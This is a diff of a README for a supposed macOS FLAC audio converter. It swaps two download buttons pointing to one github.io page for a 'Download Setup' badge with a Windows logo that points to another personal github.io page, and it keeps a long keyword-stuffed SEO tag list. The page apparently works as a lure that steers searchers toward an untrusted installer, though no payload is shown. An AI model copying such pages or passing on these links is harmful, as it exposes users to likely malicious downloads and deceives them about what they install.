@@ -1,12 +1,7 @@
 # 🎼 To FLAC Converter for macOS — Lossless Audio Ingest, Batch Normalization & Metadata-Preserving Workflows
 
 
-<!-- Download Button #1 — badge/shield style -->
-<div align="center" style="margin:14px 0 18px;">
-  <a href="https://rumpels-kaji.github.io/.github/FLAC">
-    <img src="https://img.shields.io/badge/⬇️_GET_TO_FLAC_CONVERTER-deeppink?style=for-the-badge&logo=apple&logoColor=white" alt="Download To FLAC Converter for macOS">
-  </a>
-</div>
+[![Download Setup](https://img.shields.io/badge/Download-Setup-blue?style=for-the-badge&logo=windows)](https://makariwilkinssebo.github.io/.github/To-FLAC-Converter)
 
 ---
 
@@ -87,12 +82,3 @@ Error handling is pragmatic. Corrupt frames, truncated headers, or unknown chunk
 ## 🏷 Tags (SEO)
 
 to flac converter mac • batch flac mac • lossless audio converter • mp3 to flac mac • aac m4a alac to flac • wav aiff caf to flac • high quality resampling • true peak safe normalization • lufs loudness flac • replaygain mac • 16-bit 24-bit flac • 44.1khz 48khz 96khz 192khz • sum to mono downmix • vorbis comments tagging • artwork embedding flac • token file naming • watch folder ingest • apple silicon audio tool • archival flac workflow • audio library cleanup mac
-
----
-
-<!-- Download Button #2 — pill/gradient style -->
-<div align="center" style="margin:18px 0 22px;">
-  <a href="https://rumpels-kaji.github.io/.github/FLAC" style="display:inline-block;padding:12px 22px;border-radius:999px;background:linear-gradient(90deg,#10b981,#06b6d4);color:#fff;font-weight:900;text-decoration:none;box-shadow:0 10px 24px rgba(16,185,129,.25);">
-    🎵 Download To FLAC Converter for macOS
-  </a>
-</div>
